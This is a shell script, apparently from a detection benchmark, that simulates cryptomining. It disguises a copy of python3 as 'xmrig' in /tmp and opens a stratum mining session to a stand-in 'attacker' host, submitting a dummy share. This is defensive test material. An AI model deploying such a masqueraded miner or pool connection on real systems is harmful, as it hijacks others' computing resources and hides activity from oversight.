#!/bin/sh
set -u
marker="${BENCH_MARKER:-manual}"
attacker="${BENCH_ATTACKER:-attacker}"
work="/tmp/bench-$marker"

miner_dir="/tmp/bench-miner-$marker"
miner="$miner_dir/xmrig"

miner_code='
import hashlib
import json
import socket
import sys
import time

options = dict(zip(sys.argv[1::2], sys.argv[2::2]))
pool_host, pool_port = options["--url"].split("//", 1)[1].rsplit(":", 1)
worker = options["--user"]
connection = socket.create_connection((pool_host, int(pool_port)), timeout=5)
stream = connection.makefile("rw")

def call(request_id, method, params):
    stream.write(json.dumps({"id": request_id, "jsonrpc": "2.0", "method": method, "params": params}) + "\n")
    stream.flush()
    return json.loads(stream.readline())

job = call(1, "login", {"login": worker, "pass": options["--pass"], "agent": "xmrig/6.21.0"})["result"]["job"]
deadline = time.monotonic() + 3
nonce = 0
digest = b""
while time.monotonic() < deadline:
    digest = hashlib.sha256(job["blob"].encode() + nonce.to_bytes(8, "little")).digest()
    nonce += 1
call(2, "submit", {"id": worker, "job_id": job["job_id"], "nonce": format(nonce, "016x"), "result": digest.hex()})
connection.close()
print("xmrig simulation computed", nonce, "hashes")
'

sh "$(dirname "$0")/cleanup.sh"
mkdir -p "$miner_dir" "$work" || exit 1
cp "$(command -v python3)" "$miner" || exit 1
echo "BENCH_ACTION $(date +%s.%N)"
PYTHONHOME=/usr "$miner" -c "$miner_code" \
    --url "stratum+tcp://$attacker:3333" \
    --user "bench-$marker" \
    --pass x \
    --donate-level 1 > "$work/miner.out" || exit 1
cat "$work/miner.out"
